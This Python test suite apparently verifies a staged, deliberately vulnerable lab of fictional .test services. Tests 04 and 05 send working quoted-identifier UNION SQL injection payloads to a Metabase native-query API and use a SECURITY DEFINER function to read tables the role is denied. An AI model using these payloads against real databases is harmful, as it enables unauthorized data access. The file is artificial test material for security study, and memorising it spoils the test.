#!/usr/bin/env python3
from __future__ import annotations

import json
import subprocess
import unittest


CLIENT = "cinder-arwc-connector"
DATA = "cinder-arwc-data"
BASE = "https://planning-data.arwc.test"


def inside(*arguments: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "exec", "-i", "--user", "fieldlink", CLIENT, *arguments],
        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
    )


def request(path: str, *, method: str = "GET", body: dict | None = None,
            token: str | None = None, tenant: str = "arwc",
            planner: str | None = "@planner") -> tuple[int, dict]:
    script = r'''
import json, pathlib, ssl, sys, urllib.error, urllib.request
method, url, tenant, supplied, planner, body = sys.argv[1:]
if supplied == "@session":
    supplied = pathlib.Path("/var/lib/fieldlink-connector/handover/corporate-session").read_text().strip()
if planner == "@planner":
    planner = pathlib.Path("/var/lib/fieldlink-connector/receipts/planner-session").read_text().strip()
headers = {"Authorization": "Bearer " + supplied, "X-ARWC-Tenant": tenant}
if planner:
    headers["X-ARWC-Planner-Session"] = planner
data = None if not body else body.encode()
if data is not None:
    headers["Content-Type"] = "application/json"
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
try:
    response = urllib.request.urlopen(
        urllib.request.Request(url, data=data, headers=headers, method=method), context=context
    )
except urllib.error.HTTPError as error:
    response = error
print(response.status)
print(response.read().decode())
'''
    completed = inside(
        "python3", "-c", script, method, BASE + path, tenant,
        "@session" if token is None else token,
        "" if planner is None else planner,
        "" if body is None else json.dumps(body, separators=(",", ":")),
    )
    if completed.returncode:
        raise AssertionError(completed.stderr)
    status, payload = completed.stdout.splitlines()
    return int(status), json.loads(payload)


def metabase_request(path: str, *, method: str = "GET", body: dict | None = None,
                     session: str = "") -> tuple[int, dict]:
    """Make a request to the Metabase API from inside the connector container."""
    script = r'''
import json, ssl, sys, urllib.error, urllib.request
method, url, session, body = sys.argv[1:]
headers = {"Content-Type": "application/json"}
if session:
    headers["X-Metabase-Session"] = session
data = None if not body else body.encode()
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
try:
    response = urllib.request.urlopen(
        urllib.request.Request(url, data=data, headers=headers, method=method), context=context
    )
except urllib.error.HTTPError as error:
    response = error
print(response.status)
print(response.read().decode())
'''
    completed = inside(
        "python3", "-c", script, method, f"https://reports.arwc.test{path}",
        session, "" if body is None else json.dumps(body, separators=(",", ":")),
    )
    if completed.returncode:
        raise AssertionError(completed.stderr)
    status, payload = completed.stdout.splitlines()
    return int(status), json.loads(payload)


class W11Live(unittest.TestCase):
    # Metabase session for the planning user, obtained once per suite run.
    _metabase_session: str = ""

    @classmethod
    def setUpClass(cls) -> None:
        """Get a Metabase session for the planning user (derived from seed reports setup)."""
        script = r'''
import hashlib, hmac, json, os, ssl, sys, urllib.request
seed = os.environ.get("STAFF_SEED", "")
if not seed:
    print("no STAFF_SEED")
    sys.exit(1)
email = "nadia.corvane@alterrawaterco.com"
password = hmac.new(seed.encode(), email.encode(), hashlib.sha256).hexdigest()
context = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
req = urllib.request.Request(
    "https://reports.arwc.test/api/session",
    data=json.dumps({"username": email, "password": password}).encode(),
    headers={"Content-Type": "application/json"},
)
try:
    with urllib.request.urlopen(req, context=context) as resp:
        print(json.load(resp)["id"])
except Exception as error:
    print(f"ERROR: {error}")
    sys.exit(1)
'''
        completed = subprocess.run(
            ["docker", "exec", "-i", DATA, "python3", "-c", script],
            text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
        )
        if completed.returncode:
            raise AssertionError(f"Metabase session setup failed: {completed.stderr}")
        cls._metabase_session = completed.stdout.strip()

    def test_01_retired_bolt_endpoints_return_410(self) -> None:
        """Old Bolt facade endpoints return 410 Gone."""
        for path, method, body in [
            ("/api/relation-schemas/current", "GET", None),
            ("/api/relation-exchanges", "POST", {"exchange": "aGVsbG8="}),
            ("/api/asset-lineage/current", "POST", {"exchange": "aGVsbG8="}),
        ]:
            status, body_resp = request(path, method=method, body=body)
            self.assertEqual(status, 410, f"{method} {path} should return 410")
            self.assertIn("retired", json.dumps(body_resp))

    def test_02_client_doc_exposes_native_metabase_routes(self) -> None:
        """Client document exposes native Metabase card URLs for W11 routes."""
        status, response = request("/.well-known/arwc-client")
        self.assertEqual(status, 200)
        routes = {r["key"]: r["template"] for r in response["routes"]}
        self.assertIn("planning.relation-schema", routes)
        self.assertIn("planning.relation-exchange", routes)
        self.assertIn("planning.asset-lineage", routes)
        schema_url = routes["planning.relation-schema"]
        exchange_url = routes["planning.relation-exchange"]
        self.assertIn("reports.arwc.test/api/card/", schema_url)
        self.assertIn("reports.arwc.test/api/card/", exchange_url)
        # asset-lineage points to the planning-data endpoint (returns 410)
        self.assertIn("planning-data.arwc.test", routes["planning.asset-lineage"])

    def test_03_metabase_relproto_question_returns_contract(self) -> None:
        """W11.1: Metabase RELPROTO question returns the ERPNext API contract."""
        status, response = request("/.well-known/arwc-client")
        self.assertEqual(status, 200)
        routes = {r["key"]: r["template"] for r in response["routes"]}
        schema_url = routes["planning.relation-schema"]
        # Card metadata endpoint (/api/card/{id})
        status, card = metabase_request(
            schema_url.split("reports.arwc.test")[1],
            session=self._metabase_session,
        )
        self.assertEqual(status, 200)
        # The card references the relation_contracts table
        display_name = card.get("name", "")
        self.assertIn("RELPROTO", display_name)

    def test_04_metabase_rel_query_injection_reveals_protected_response(self) -> None:
        """W11.2: Quoted-identifier injection in REL-QUERY question returns REL-ASC-CRR-4417-R3."""
        status, response = request("/.well-known/arwc-client")
        self.assertEqual(status, 200)
        routes = {r["key"]: r["template"] for r in response["routes"]}
        exchange_url = routes["planning.relation-exchange"]
        card_path = exchange_url.split("reports.arwc.test")[1]
        # Discover database ID from the card
        status, card = metabase_request(card_path, session=self._metabase_session)
        self.assertEqual(status, 200)
        database_id = card["database_id"]
        # Ordinary query: returns work_order_summary rows only
        ordinary = "work_order_summary"
        status, ordinary_result = metabase_request("/api/dataset", method="POST",
            session=self._metabase_session,
            body={"database": database_id, "type": "native",
                  "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{ordinary}" WHERE asset=\'AST-CRR-017\'',
                             "template-tags": {}}})
        self.assertEqual(status, 202)
        rows = ordinary_result.get("data", {}).get("rows", [])
        record_ids = [row[0] for row in rows]
        self.assertNotIn("REL-ASC-CRR-4417-R3", record_ids)
        # Injection: escaping the identifier returns relation_responses row
        injection = 'work_order_summary" UNION SELECT name, revision, relation, asset, work_order FROM relation_responses --'
        status, inject_result = metabase_request("/api/dataset", method="POST",
            session=self._metabase_session,
            body={"database": database_id, "type": "native",
                  "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{injection}',
                             "template-tags": {}}})
        self.assertEqual(status, 202)
        rows = inject_result.get("data", {}).get("rows", [])
        record_ids = [row[0] for row in rows]
        self.assertIn("REL-ASC-CRR-4417-R3", record_ids)
        rel_row = next(row for row in rows if row[0] == "REL-ASC-CRR-4417-R3")
        self.assertEqual(rel_row[2], "ASSET_WORK")
        self.assertEqual(rel_row[3], "AST-CRR-017")
        self.assertEqual(rel_row[4], "WO-CRR-4417")

    def test_05_security_definer_injection_reveals_protected_lineage(self) -> None:
        """W11.3: UNION injection calling get_asset_lineage() bypasses planning_reader restriction."""
        status, response = request("/.well-known/arwc-client")
        self.assertEqual(status, 200)
        routes = {r["key"]: r["template"] for r in response["routes"]}
        exchange_url = routes["planning.relation-exchange"]
        card_path = exchange_url.split("reports.arwc.test")[1]
        status, card = metabase_request(card_path, session=self._metabase_session)
        self.assertEqual(status, 200)
        database_id = card["database_id"]
        # Direct SELECT on lineage_records must be denied
        status, denied = metabase_request("/api/dataset", method="POST",
            session=self._metabase_session,
            body={"database": database_id, "type": "native",
                  "native": {"query": "SELECT * FROM lineage_records",
                             "template-tags": {}}})
        self.assertNotEqual(status, 202, "Direct SELECT on lineage_records must be denied to planning_reader")
        # UNION injection calling get_asset_lineage() bypasses the restriction
        injection = 'work_order_summary" UNION SELECT name, revision, relation, asset, work_order FROM get_asset_lineage(\'AST-CRR-017\') --'
        status, inject_result = metabase_request("/api/dataset", method="POST",
            session=self._metabase_session,
            body={"database": database_id, "type": "native",
                  "native": {"query": f'SELECT name, revision, relation, asset, work_order FROM "{injection}',
                             "template-tags": {}}})
        self.assertEqual(status, 202)
        rows = inject_result.get("data", {}).get("rows", [])
        record_ids = [row[0] for row in rows]
        self.assertIn("LIN-AST-CRR-017-R8", record_ids)
        lin_row = next(row for row in rows if row[0] == "LIN-AST-CRR-017-R8")
        self.assertEqual(lin_row[3], "AST-CRR-017")
        self.assertIn("ARC-COLD-CRR-2019", lin_row[2])

    def test_06_authorization_is_enforced_on_client_doc(self) -> None:
        """Planning session is required to read the client document."""
        status, body = request("/.well-known/arwc-client", planner=None)
        self.assertEqual(status, 403)
        self.assertNotIn("planning.relation-schema", json.dumps(body))
        status, body = request("/.well-known/arwc-client", token="wrong")
        self.assertEqual(status, 403)
        status, body = request("/.well-known/arwc-client", tenant="merewick")
        self.assertEqual(status, 403)
        self.assertNotIn("planning.relation-schema", json.dumps(body))


if __name__ == "__main__":
    unittest.main(verbosity=2)
